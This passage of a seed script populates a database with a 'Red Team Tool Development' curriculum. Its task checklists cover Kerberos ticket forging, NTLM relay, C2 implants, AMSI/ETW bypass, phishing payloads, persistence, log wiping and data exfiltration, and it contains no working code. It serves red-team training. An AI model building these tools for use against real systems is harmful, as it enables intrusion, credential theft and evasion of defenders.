      { title: 'Golden Ticket Generator', description: 'Forge TGT with KRBTGT hash', details: '## Requirements\n- KRBTGT NTLM hash (or AES key)\n- Domain SID\n- Domain name\n\n### Tasks\n- [ ] Implement golden ticket generation\n- [ ] Support RC4 and AES keys\n- [ ] Set arbitrary PAC contents\n- [ ] Long expiration times' }
    ]
  },
  // Phase 4.5: Network Attacks
  {
    name: 'Phase 4.5: Network Attacks',
    description: 'LLMNR/NBT-NS poisoning, NTLM relay, ARP spoofing, DNS spoofing',
    tasks: [
      { title: 'LLMNR/NBT-NS Poisoner', description: 'Capture NTLMv1/v2 hashes from name resolution', details: '## Protocols\n- LLMNR (UDP 5355)\n- NBT-NS (UDP 137)\n- mDNS (UDP 5353)\n\n### Tasks\n- [ ] LLMNR responder (Go)\n- [ ] NBT-NS responder\n- [ ] NTLM hash capture and formatting\n- [ ] Selective poisoning' },
      { title: 'NTLM Relay', description: 'Relay authentication to other services', details: '## Relay Targets\n- SMB -> SMB (code execution)\n- SMB -> LDAP (AD attacks)\n- HTTP -> SMB\n\n### Tasks\n- [ ] Basic SMB server for capture (Python)\n- [ ] NTLM relay to SMB\n- [ ] SMB to LDAP relay\n- [ ] IPv6 DNS takeover' },
      { title: 'ARP Spoofing', description: 'MitM via gratuitous ARP replies', details: '## Tasks\n- [ ] Basic ARP spoof (Python/Scapy)\n- [ ] ARP spoof with raw sockets (Go)\n- [ ] Automatic gateway detection\n- [ ] High-performance forwarding (Rust)' },
      { title: 'DNS Spoofing', description: 'Intercept and redirect DNS queries', details: '## Tasks\n- [ ] DNS proxy with selective spoofing (Go)\n- [ ] WPAD injection\n- [ ] DHCPv6 DNS takeover (Python)\n- [ ] Integrate with ARP spoof' },
      { title: 'SOCKS Proxy / Pivoting', description: 'Network tunneling through compromised hosts', details: '## Tasks\n- [ ] SOCKS5 proxy server (Go)\n- [ ] Reverse SOCKS (implant connects out)\n- [ ] Traffic encryption layer\n- [ ] Multi-hop chaining' },
      { title: 'Packet Sniffer', description: 'Capture and parse credentials from traffic', details: '## Protocols\n- HTTP basic auth, form posts\n- FTP, Telnet, SMTP, POP3/IMAP\n- NTLM over HTTP/SMB\n\n### Tasks\n- [ ] Raw capture with gopacket (Go)\n- [ ] HTTP credential extraction\n- [ ] NTLM hash extraction\n- [ ] PCAP output' },
      { title: 'IPv6 Attacks', description: 'DHCPv6, WPAD abuse', details: '## Tasks\n- [ ] DHCPv6 server/attacker (Python)\n- [ ] Router advertisement manipulation\n- [ ] WPAD file serving\n- [ ] Integration with NTLM relay' }
    ]
  },
  // Phase 5: Lateral Movement
  {
    name: 'Phase 5: Lateral Movement',
    description: 'SMB, PsExec, WMI, WinRM, Pass-the-Hash, DCOM',
    tasks: [
      { title: 'SMB Client', description: 'Connect to shares, named pipes, file operations', details: '## Tasks\n- [ ] Connect with credentials (Go)\n- [ ] List share contents\n- [ ] Upload/download files\n- [ ] IPC$ for RPC' },
      { title: 'PsExec Implementation', description: 'Service-based remote execution', details: '## Steps\n1. Upload service exe to ADMIN$\n2. Create and start remote service\n3. Capture output via named pipe\n4. Cleanup\n\n### Tasks\n- [ ] Upload to ADMIN$ (Go)\n- [ ] Create/start service\n- [ ] Output capture (Python)\n- [ ] Cleanup' },
      { title: 'WMI Execution', description: 'Remote process creation via WMI', details: '## Tasks\n- [ ] Local WMI process creation (C#)\n- [ ] Remote WMI execution\n- [ ] Output retrieval via SMB\n- [ ] Semi-interactive shell' },
      { title: 'WinRM Client', description: 'PowerShell remoting protocol', details: '## Tasks\n- [ ] HTTP WinRM connection (Go)\n- [ ] NTLM authentication\n- [ ] Create command shell\n- [ ] Interactive shell capability' },
      { title: 'Pass-the-Hash', description: 'Authenticate with NT hash instead of password', details: '## Tasks\n- [ ] Understand NTLM flow (Python)\n- [ ] Implement NTLM with hash\n- [ ] Use with SMB client\n- [ ] Use with WMI client' },
      { title: 'DCOM Lateral Movement', description: 'MMC20.Application, ShellWindows execution', details: '## DCOM Objects\n- MMC20.Application\n- ShellWindows\n- ShellBrowserWindow\n- Excel.Application\n\n### Tasks\n- [ ] Remote DCOM instantiation (C#)\n- [ ] MMC20.Application execution\n- [ ] ShellWindows execution (C++)\n- [ ] Document available methods' }
    ]
  },
  // Phase 6: C2
  {
    name: 'Phase 6: Command and Control',
    description: 'HTTP/DNS/SMB implants, traffic blending, evasion',
    tasks: [
      { title: 'Basic HTTP Implant', description: 'Beacon, command execution, encryption', details: '## Architecture\n- Implant: Sleep, check-in, execute, return results\n- Server: Queue commands, store results\n\n### Tasks\n- [ ] Basic beacon (Rust)\n- [ ] Command execution\n- [ ] File upload/download\n- [ ] AES-256-GCM encryption\n- [ ] Jitter\n- [ ] Server with command queue (Go)' },
      { title: 'DNS C2', description: 'Data exfil/commands via DNS queries', details: '## Encoding\n- Subdomain: [data].yourdomain.com\n- TXT records for larger chunks\n\n### Tasks\n- [ ] DNS beacon (Rust)\n- [ ] TXT record command delivery (Go server)\n- [ ] Chunked data exfiltration\n- [ ] Packet loss handling' },
      { title: 'SMB Named Pipe Implant', description: 'P2P C2 for internal pivoting', details: '## Use Case\n- Internal hosts without egress\n- Chain: C2 -> edge beacon -> SMB beacon\n\n### Tasks\n- [ ] Named pipe implant (C++)\n- [ ] Link to HTTP parent (Go)\n- [ ] Forward commands through chain\n- [ ] Daisy-chaining' },
      { title: 'C2 Traffic Blending', description: 'Mimic legitimate traffic patterns', details: '## Techniques\n- Mimic CDNs, Slack, Teams\n- Match real headers\n- Domain fronting (if available)\n\n### Tasks\n- [ ] Profile-based requests (Go)\n- [ ] Multiple URI endpoints\n- [ ] Realistic headers/cookies\n- [ ] Response transformation' },
      { title: 'Implant Core Framework', description: 'Modular post-ex capability loading', details: '## Features\n- In-memory .NET execution\n- Reflective DLL loading\n- SOCKS proxy, port forwarding\n- Screenshot, keylogger\n\n### Tasks\n- [ ] Modular architecture (Rust)\n- [ ] In-memory .NET (CLR hosting)\n- [ ] Reflective DLL loader\n- [ ] SOCKS proxy' },
      { title: 'Evasion Techniques', description: 'Syscalls, unhooking, sleep evasion, ETW/AMSI', details: '## Techniques\n1. Direct syscalls (avoid hooks)\n2. Unhooking (remap clean ntdll)\n3. Sleep with memory encryption\n4. ETW patching\n5. AMSI bypass\n\n### Tasks\n- [ ] Direct syscalls (C/ASM)\n- [ ] ntdll unhooking (C++)\n- [ ] Sleep encryption (Rust)\n- [ ] ETW patching\n- [ ] AMSI bypass (C#)' }
    ]
  },
  // Phase 6.5: Initial Access
  {
    name: 'Phase 6.5: Initial Access',
    description: 'Phishing payloads, macros, HTML smuggling, LNK/ISO delivery',
    tasks: [
      { title: 'Phishing Payload Generator', description: 'Builder for various delivery formats', details: '## Payload Types\n- Office documents (macro, template injection)\n- HTML/HTA files\n- LNK files, ISO containers\n\n### Tasks\n- [ ] Builder CLI framework (Go)\n- [ ] Macro templates (VBA)\n- [ ] LNK generator\n- [ ] ISO builder' },
      { title: 'Office Macro Weaponization', description: 'Auto_Open, sandbox detection, shellcode', details: '## Tasks\n- [ ] Download and execute macro\n- [ ] Shellcode runner via VBA\n- [ ] Macro obfuscator (Python)\n- [ ] Sandbox detection checks' },
      { title: 'HTML Smuggling', description: 'Browser-based payload assembly', details: '## Concept\n- Embed payload as base64 in HTML\n- JS assembles in browser\n- Triggers download\n- Bypasses network inspection\n\n### Tasks\n- [ ] Basic smuggling template (JS)\n- [ ] Auto download trigger\n- [ ] Page generator (Go)\n- [ ] XOR decode in browser' },
      { title: 'LNK File Weaponization', description: 'Malicious shortcuts, icon spoofing', details: '## Tasks\n- [ ] LNK generator (Go)\n- [ ] Command execution payload\n- [ ] Icon embedding\n- [ ] NTLM capture LNK' },
      { title: 'ISO/IMG Container Delivery', description: 'Container-based MOTW bypass', details: '## Tasks\n- [ ] ISO generator (Go)\n- [ ] IMG generator\n- [ ] LNK + payload structure\n- [ ] MOTW testing' },
      { title: 'Template Injection', description: 'Remote template loading in Office docs', details: '## Tasks\n- [ ] Inject remote template (Python)\n- [ ] Create malicious template\n- [ ] Combined builder (Go)\n- [ ] RTF template injection' },
      { title: 'HTA Payloads', description: 'HTML Application attacks via mshta', details: '## Tasks\n- [ ] Basic HTA payload (VBScript)\n- [ ] Download and execute HTA (JScript)\n- [ ] HTA generator (Go)\n- [ ] Shellcode runner HTA' }
    ]
  },
  // Phase 7: Defense Evasion
  {
    name: 'Phase 7: Defense Evasion & Payloads',
    description: 'Packers, shellcode generation, loaders, anti-analysis',
    tasks: [
      { title: 'Custom PE Packer', description: 'Compress, create unpacker stub', details: '## Steps\n1. Parse PE headers\n2. Compress sections\n3. Create stub (decompress, fix relocs, resolve imports)\n4. Build new PE\n\n### Tasks\n- [ ] PE parser/builder (Go)\n- [ ] LZMA compression\n- [ ] Unpacker stub (C/ASM)\n- [ ] Import resolution' },
      { title: 'Shellcode Generator', description: 'PEB walking, API hashing, PE to shellcode', details: '## Requirements\n- Position-independent\n- Runtime API resolution\n- Self-contained\n\n### Tasks\n- [ ] PEB walking shellcode (ASM)\n- [ ] API resolution by hash (C)\n- [ ] Reverse shell shellcode\n- [ ] PE loader shellcode (Donut-style)' },
      { title: 'Loader/Dropper Variants', description: 'EXE, DLL, HTA, macro, XLL loaders', details: '## Variants\n1. Basic EXE loader\n2. DLL (DllMain, rundll32)\n3. HTA/JS loader\n4. Office macro\n5. XLL (Excel add-in)\n\n### Tasks\n- [ ] Shellcode fetcher (Rust)\n- [ ] DLL with exports (C++)\n- [ ] Environment checks' },
      { title: 'Process Injection Arsenal', description: 'Comprehensive injection technique collection', details: '## Techniques\n- CreateRemoteThread, NtCreateThreadEx\n- QueueUserAPC, Thread hijacking\n- Process hollowing, doppelganging\n- Module stomping, atom bombing\n- Callback injection, thread pool\n\n### Tasks\n- [ ] Implement each technique (C++)\n- [ ] Abstract into CLI (Go)\n- [ ] Evasive variants with syscalls (Rust)\n- [ ] Document detection vectors' },
      { title: 'Anti-Analysis Techniques', description: 'Sandbox detection, environmental keying', details: '## Sandbox Detection\n- CPU cores (<2 suspicious)\n- RAM (<4GB suspicious)\n- Disk size (<60GB)\n- VM artifacts\n- Analysis tools running\n\n### Tasks\n- [ ] VM detection (C++)\n- [ ] Sandbox detection suite (Rust)\n- [ ] Time acceleration detection\n- [ ] Environment-keyed execution (Go)' }
    ]
  },
  // Phase 8: Persistence
  {
    name: 'Phase 8: Persistence',
    description: 'Registry, scheduled tasks, DLL hijacking, COM hijacking, WMI, SSP',
    tasks: [
      { title: 'Registry Persistence', description: 'Run keys, Winlogon, services', details: '## Locations\n- HKCU/HKLM Run keys\n- Winlogon Shell/Userinit\n- Environment UserInitMprLogonScript\n\n### Tasks\n- [ ] Run key persistence (C#)\n- [ ] Winlogon persistence (C++)\n- [ ] Service creation (Go)\n- [ ] Cleanup tool' },
      { title: 'Scheduled Task Persistence', description: 'COM-based task creation with various triggers', details: '## Triggers\n- At logon, startup\n- On idle, on schedule\n- On event (event log trigger)\n\n### Tasks\n- [ ] Create task via COM (C#)\n- [ ] Multiple trigger types\n- [ ] Hidden task creation\n- [ ] Enumeration and cleanup' },
      { title: 'DLL Hijacking', description: 'Search order abuse, proxy DLL creation', details: '## Tasks\n- [ ] Scan for hijackable DLLs (Go)\n- [ ] Create proxy DLL (C++)\n- [ ] Test with common apps\n- [ ] Automated generator' },
      { title: 'COM Hijacking', description: 'CLSID/InprocServer32 abuse', details: '## Tasks\n- [ ] Enumerate COM objects (Go)\n- [ ] Find hijackable CLSIDs (Python)\n- [ ] Create COM DLL (C++)\n- [ ] HKCU hijack implementation' },
      { title: 'WMI Event Subscription', description: 'EventFilter + EventConsumer binding', details: '## Components\n- EventFilter (WQL trigger)\n- EventConsumer (CommandLineEventConsumer)\n- Binding\n\n### Tasks\n- [ ] Create EventFilter (C#)\n- [ ] Create consumer and binding\n- [ ] Multiple trigger conditions\n- [ ] Enumeration and cleanup' },
      { title: 'Security Support Provider', description: 'SSP DLL for credential capture', details: '## Concept\n- SSPs loaded by LSASS\n- Receive plaintext credentials at logon\n\n### Tasks\n- [ ] Create minimal SSP DLL (C++)\n- [ ] Log captured credentials\n- [ ] Registry registration\n- [ ] In-memory registration (AddSecurityPackage)' }
    ]
  },
  // Phase 8.5: Anti-Forensics
  {
    name: 'Phase 8.5: Anti-Forensics',
    description: 'Event log manipulation, timestomping, artifact removal',
    tasks: [
      { title: 'Event Log Manipulation', description: 'Clear logs, delete specific events', details: '## Tasks\n- [ ] Clear specific logs (C#)\n- [ ] Delete specific event IDs (C++)\n- [ ] Suspend EventLog threads\n- [ ] Remote clearing via WMI' },
      { title: 'Timestomping', description: 'Modify file MACE timestamps', details: '## Tasks\n- [ ] SetFileTime timestomping (C++)\n- [ ] Copy timestamps from another file\n- [ ] Recursive timestomping (Go)\n- [ ] NtSetInformationFile for deeper control' },
      { title: 'Artifact Removal', description: 'Prefetch, ShimCache, AmCache, history', details: '## Artifacts\n- Prefetch, Recent files, Jump lists\n- ShimCache, AmCache\n- BAM/DAM, SRUM\n- PowerShell history\n\n### Tasks\n- [ ] Prefetch deletion (C++)\n- [ ] Clear recent files (C#)\n- [ ] ShimCache clearing\n- [ ] Comprehensive cleanup tool (Go)' },
      { title: 'Secure Deletion', description: 'Overwrite and delete files securely', details: '## Tasks\n- [ ] Secure file overwrite (C++)\n- [ ] Multi-pass deletion (Rust)\n- [ ] Handle alternate data streams\n- [ ] Secure delete CLI tool (Go)' }
    ]
  },
  // Phase 8.6: Data Exfiltration
  {
    name: 'Phase 8.6: Data Exfiltration',
    description: 'Discovery, staging, HTTP/DNS/ICMP exfil channels',
    tasks: [
      { title: 'Data Discovery', description: 'Find sensitive files, patterns, keywords', details: '## Targets\n- Documents (docx, xlsx, pdf)\n- Configs, private keys, password files\n- High entropy files\n\n### Tasks\n- [ ] Fast recursive scanner (Go)\n- [ ] Regex patterns (CC, SSN)\n- [ ] Keyword search\n- [ ] Entropy calculation' },
      { title: 'Data Staging', description: 'Compress, encrypt, split for exfil', details: '## Tasks\n- [ ] File collection (Go)\n- [ ] ZIP with password\n- [ ] AES encryption wrapper (C++)\n- [ ] File chunking' },
      { title: 'HTTP/HTTPS Exfiltration', description: 'POST, cloud storage, traffic blending', details: '## Tasks\n- [ ] HTTP POST client (Go)\n- [ ] Chunked upload with retry (Rust)\n- [ ] Receiving server (Python)\n- [ ] Cloud storage upload' },
      { title: 'DNS Exfiltration', description: 'Encode data in DNS queries', details: '## Encoding\n- Subdomain (63 char label limit)\n- TXT records for larger data\n\n### Tasks\n- [ ] DNS exfil client (Go)\n- [ ] DNS exfil server\n- [ ] Chunking and reassembly\n- [ ] Multiple record types' },
      { title: 'Protocol Tunneling', description: 'ICMP, HTTP headers, steganography', details: '## Tasks\n- [ ] ICMP tunnel (Go)\n- [ ] Image steganography (Python)\n- [ ] HTTP header hiding\n- [ ] Document whitespace encoding' }
    ]
  },
  // Phase 8.7: Cloud Attacks
  {
    name: 'Phase 8.7: Cloud Attack Basics',
    description: 'Cloud credential discovery, metadata exploitation, enumeration',
    tasks: [
      { title: 'Cloud Credential Discovery', description: 'Find AWS/Azure/GCP credentials', details: '## Locations\n- AWS: ~/.aws/credentials, env vars, EC2 metadata\n- Azure: ~/.azure/, tokens, managed identity\n- GCP: ~/.config/gcloud/, metadata\n\n### Tasks\n- [ ] Credential file scanner (Go)\n- [ ] Environment variable checker\n- [ ] Cloud config parser (Python)\n- [ ] Metadata service querying' },
      { title: 'Cloud Metadata Exploitation', description: 'IMDS abuse for role credentials', details: '## Tasks\n- [ ] AWS metadata extractor (Go)\n- [ ] Azure token fetcher\n- [ ] GCP metadata querying\n- [ ] Unified metadata tool (Python)' },
      { title: 'Cloud Enumeration', description: 'List resources, check permissions', details: '## Tasks\n- [ ] AWS enumeration (Python boto3)\n- [ ] Azure enumeration\n- [ ] Cross-cloud tool (Go)\n- [ ] Permission checking' },
      { title: 'Cloud Persistence', description: 'Backdoor IAM users, service principals', details: '## Tasks\n- [ ] AWS backdoor user (Python)\n- [ ] Azure service principal (Python)\n- [ ] Serverless backdoor\n- [ ] Persistence auditing' }
    ]
  },
  // Phase 8.8: Physical Attacks
  {
    name: 'Phase 8.8: Physical & USB Attacks',
    description: 'Rubber Ducky, BadUSB, USB data exfiltration',
    tasks: [
      { title: 'Rubber Ducky Payloads', description: 'HID keystroke injection', details: '## Tasks\n- [ ] PowerShell download-execute (DuckyScript)\n- [ ] Reverse shell payload\n- [ ] DuckyScript compiler (Go)\n- [ ] Credential harvesting' },
      { title: 'BadUSB Firmware', description: 'Programmable USB device attacks', details: '## Platforms\n- Digispark, Teensy\n- Raspberry Pi Pico\n- ESP32-S2/S3\n\n### Tasks\n- [ ] Digispark payload (Arduino)\n- [ ] Pico HID attack (CircuitPython)\n- [ ] Composite device (HID + storage)' },
      { title: 'USB Data Exfiltration', description: 'Quick data copy on USB insertion', details: '## Tasks\n- [ ] USB insertion monitor (Go)\n- [ ] Quick file copy to USB\n- [ ] Targeted file collection\n- [ ] USB automation framework' }
    ]
  },
  // Phase 8.9: RE Basics
  {
    name: 'Phase 8.9: Reverse Engineering Basics',
    description: 'Static analysis, dynamic analysis, EDR understanding',
    tasks: [
      { title: 'Static Analysis Tools', description: 'PE parsing, imports, strings, entropy', details: '## Tasks\n- [ ] PE import analyzer (Python)\n- [ ] Suspicious API identifier\n- [ ] String extractor (Go)\n- [ ] Entropy calculator\n- [ ] Basic YARA scanner' },
      { title: 'Dynamic Analysis Environment', description: 'Process, file, network monitoring', details: '## Tasks\n- [ ] Process creation logger (Python)\n- [ ] File system watcher\n- [ ] Network connection logger\n- [ ] Combined behavior logger (Go)' },
      { title: 'EDR Analysis', description: 'Understand hook detection and bypass', details: '## EDR Techniques\n- Userland hooking\n- Kernel callbacks\n- ETW consumers\n- Memory scanning\n\n### Tasks\n- [ ] Hook detector (C++)\n- [ ] List loaded drivers (Python)\n- [ ] ETW provider enumeration\n- [ ] Hook comparison tool' },
      { title: 'Malware Analysis Practice', description: 'Safe analysis of real samples', details: '## Tasks\n- [ ] Analyze 5 commodity samples\n- [ ] Extract IOCs from 3 samples\n- [ ] Write YARA rule for 1 family\n- [ ] Document C2 patterns\n- [ ] Create analysis report template' }
    ]
  },
  // Phase 9: Capstone Projects
  {
    name: 'Phase 9: Capstone Projects',
    description: 'Complete frameworks: C2, AD toolkit, loaders, credentials, network, exfil, initial access, privesc',
    tasks: [
      { title: 'Mini C2 Framework', description: 'Complete implant + server with multi-channel support', details: '## Deliverables\n- [ ] Working Rust implant (<100KB)\n- [ ] Multi-channel (HTTP + DNS fallback)\n- [ ] Go team server with REST API\n- [ ] CLI operator interface\n- [ ] 5+ post-ex modules (whoami, ps, ls, upload, download)\n- [ ] Documentation' },
      { title: 'Active Directory Attack Toolkit', description: 'Unified AD assessment tool', details: '## Deliverables\n- [ ] Single Go binary with subcommands\n- [ ] LDAP enumeration module\n- [ ] Kerberoast module\n- [ ] AS-REP roast module\n- [ ] Password spray module (with safety)\n- [ ] BloodHound JSON output\n- [ ] OPSEC documentation' },
      { title: 'Evasive Loader Framework', description: 'Configurable payload delivery system', details: '## Deliverables\n- [ ] Go builder with CLI/config\n- [ ] Rust EXE loader template\n- [ ] Rust DLL loader template\n- [ ] C++ service loader\n- [ ] Sandbox evasion module\n- [ ] Evasion documentation' },
      { title: 'Credential Harvesting Suite', description: 'LSASS, SAM, vault, browser credentials', details: '## Deliverables\n- [ ] LSASS dumper with multiple techniques (C++)\n- [ ] Evasive minidump (Rust syscalls)\n- [ ] Offline dump parser (Python)\n- [ ] Token impersonation tool (C#)\n- [ ] Standalone SAM dumper (Go)' },
      { title: 'Network Attack Suite', description: 'MitM and credential capture toolkit', details: '## Deliverables\n- [ ] LLMNR/NBT-NS poisoner (Go)\n- [ ] NTLM relay (Python)\n- [ ] ARP spoof with forwarding (Go)\n- [ ] DNS spoof server\n- [ ] Credential formatter\n- [ ] Unified interface' },
      { title: 'Exfiltration Framework', description: 'Multi-channel data exfil system', details: '## Deliverables\n- [ ] Data discovery/staging tool (Go)\n- [ ] Multi-channel client (Rust)\n- [ ] Receiving server (Go)\n- [ ] DNS exfil implementation\n- [ ] HTTP with traffic blending' },
      { title: 'Initial Access Toolkit', description: 'Payload generation and delivery', details: '## Deliverables\n- [ ] Unified payload builder CLI (Go)\n- [ ] VBA macro library\n- [ ] HTML smuggling templates\n- [ ] LNK generator\n- [ ] ISO container builder\n- [ ] Obfuscation engine (Python)' },
      { title: 'Privilege Escalation Scanner', description: 'Comprehensive local privesc discovery', details: '## Deliverables\n- [ ] Unified privesc scanner (Go)\n- [ ] Service vulnerability checks (C#)\n- [ ] Registry permission analyzer\n- [ ] Token privilege checker (C++)\n- [ ] Kernel exploit suggester\n- [ ] Prioritized findings output' }
    ]
  }
];

// Insert all modules and tasks
let moduleOrder = 0;
for (const mod of modules) {
  const modResult = insertModule.run(pathId, mod.name, mod.description, moduleOrder++, now);
  const moduleId = modResult.lastInsertRowid;

  let taskOrder = 0;
  for (const task of mod.tasks) {
    insertTask.run(moduleId, task.title, task.description, task.details, taskOrder++, now);
  }
}

// Count totals
const moduleCount = db.prepare('SELECT COUNT(*) as count FROM modules WHERE path_id = ?').get(pathId) as { count: number };
const taskCount = db.prepare('SELECT COUNT(*) as count FROM tasks t JOIN modules m ON t.module_id = m.id WHERE m.path_id = ?').get(pathId) as { count: number };

console.log(`Created path: Red Team Tool Development`);
console.log(`Modules: ${moduleCount.count}`);
console.log(`Tasks: ${taskCount.count}`);
